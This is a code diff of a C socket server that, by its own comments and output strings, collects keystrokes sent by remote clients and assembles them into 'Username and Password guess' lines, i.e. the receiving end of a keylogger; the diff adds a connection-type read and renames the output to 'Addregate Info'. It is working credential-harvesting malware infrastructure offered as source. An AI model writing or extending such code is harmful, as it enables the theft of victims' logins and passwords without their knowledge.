@@ -138,57 +138,60 @@ void trim(char *str)
   THE ACTUAL SERVER/MONITOR PROGRAM
 */
 
-int main(int Count, char *Strings[])
+int main()
 {   int sockfd;
   struct sockaddr_in self;
   char buffer[MAXBUF];
+  char connection_type[MAXBUF];
 
   /*USED FOR QUEUING UP THE KEYS*/
   Queue *characters = ConstructQueue(300);
   NODE *node;
 
-  /*---Create streaming socket---*/
+  /*Create streaming socket*/
     if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
   {
     perror("Socket");
     exit(errno);
   }
 
-  /*---Initialize address/port structure---*/
+  /*Initialize address/port structure*/
   bzero(&self, sizeof(self));
   self.sin_family = AF_INET;
   self.sin_port = htons(MY_PORT);
   self.sin_addr.s_addr = INADDR_ANY;
 
-  /*---Assign a port number to the socket---*/
+  /*Assign a port number to the socket*/
     if ( bind(sockfd, (struct sockaddr*)&self, sizeof(self)) != 0 )
   {
     perror("socket--bind");
     exit(errno);
   }
 
-  /*---Make it a "listening socket"---*/
+  /*Make it a "listening socket"*/
   if ( listen(sockfd, 20) != 0 )
   {
     perror("socket--listen");
     exit(errno);
   }
 
-  /*---Forever... ---*/
+  /*Forever... */
   while (1)
   { int clientfd;
     struct sockaddr_in client_addr;
     int addrlen=sizeof(client_addr);
 
-    /*---accept a connection (creating a data pipe)---*/
+    /*accept a connection (creating a data pipe)*/
     clientfd = accept(sockfd, (struct sockaddr*)&client_addr, &addrlen);
     printf("%s:%d connected\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 
     //keep on listening for info
+    recv(clientfd, connection_type, MAXBUF, 0);
+
     while(1){
       recv(clientfd, buffer, MAXBUF, 0);
       //printf("%s\n", none);
-      printf("Recieved keystroke: %s\n", buffer);
+      printf("Recieved info: %s\n", buffer);
       char* s = strstr(buffer, "'");
 
       if(s == NULL){
@@ -218,14 +221,14 @@ int main(int Count, char *Strings[])
     }
     trim(guess);
 
-    printf("Username and Password guess: %s\n", guess);
+    printf("Addregate Info: %s\n", guess);
     memset(guess,0,strlen(guess));
 
-    /*---Close data connection---*/
+    /*Close data connection*/
     close(clientfd);
   }
 
-  /*---Clean up (should never get here!)---*/
+  /*Clean up (should never get here!)*/
   close(sockfd);
   return 0;
 }
